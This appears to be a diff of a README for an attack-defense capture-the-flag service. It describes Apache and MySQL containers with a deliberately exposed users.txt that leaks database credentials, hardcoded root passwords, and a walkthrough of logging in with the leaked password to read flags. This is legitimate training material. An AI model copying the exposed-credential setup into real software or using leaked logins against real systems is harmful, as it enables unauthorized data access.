@@ -1,17 +1,18 @@
 # JanDaLo Service definition:
 - We have two dockers: 
 1. A mysql:8.0 image, which contains the flags on da Database. 
-2. One who has install apache service. 
+2. A httpd:2.4.50 image, with apache service. 
 The attacker has access to a web page (web_docker) and has to look for information that can help him accessing the other docker via mysql service.
-The flags are stored in that last docker's database and attacker has to let them in his T-Submission machine. 
+The flags are stored in mysql database and attacker has to let them in his T-Submission machine. 
 
 # Service implementation:
-web docker is configured to take a copy index.html and users.txt files from the host machine, letting it in '*/usr/local/apache2/htdocs/index.html*' and in '*/usr/local/apache2/htdocs/admin/users.txt*'. 
+web docker is configured to take a copy index.html and users.txt files from the host machine, letting them in '*/usr/local/apache2/htdocs/index.html*' and in '*/usr/local/apache2/htdocs/admin/users.txt*'. 
 mysql docker is configured attending to the following tips:
   - It has mysql-server installed and started. 
   - It has a user called 'dev1' whose password is 'w3ar3h4ck3r2'. 
+  - 'root' user with 'rootpassword' password (only usable for checkers)
 
-users.txt file will never be changed and the access to the database must be open. Moreover, if a team changes users.txt or denies dev1 access to the database, it will be losing SLa points. 
+users.txt file must have one line with *user:password* and the access to the database must be open. Moreover, if a team denies access to the database with the users.txt *user:password*, it will be losing SLa points. 
  
 -Flags: 
     Flags will be stored in 'jandalo_mysql_1' docker's *ctf_db* database in table *flag* that has a column *flag_value*.
@@ -25,24 +26,23 @@ users.txt file will never be changed and the access to the database must be open
   - Update the userts.txt file with the new user/password
   
   
-  Attack performed by Team1 against Team2. 
-  Visit web page in 10.0.2.101/admin
+- <b>Attack performed by Team1 against Team2: </b><br>
+  - Visit web page in 10.0.2.101/admin<br>
       We find users.txt file with 'dev1/w3ar3h4ck3r2' credentials.
   With those credentials, connect to the database of attacked machine:
+  <br><code>mysql -P 8833 -h 10.0.2.101 -u dev1 -pw3ar3h4ck3r2</code>
 
-  <code>mysql -P 8833 -h 10.0.2.101 -u dev1 -pw3ar3h4ck3r2</code>
-
-  Now see what databases exists and select the data of the only database-table:  
+  - Now see what databases exists and select the data of the only database-table:  
   <code> show databases;<br>
   select * from ctf_db.flag;<br>
   </code>
   Copy last flags and exit.
 
-  'ssh -i ./keyak/team2-sshkey root@10.0.1.1'
-  nano /root/xxx.flag
+  - Place them in Submission machine<br><code>'ssh -i ./keyak/team2-sshkey root@10.0.1.1'</code><br>
+  <code>nano /root/xxx.flag</code><br>
   Paste copied flags. 
 
-  <b>Defense performed by Team2</b>
+- <b>Defense performed by Team2:</b>
 
     - Connect to the machine and execute web docker's bash:<br>
     <code>ssh root@10.0.2.101<br>
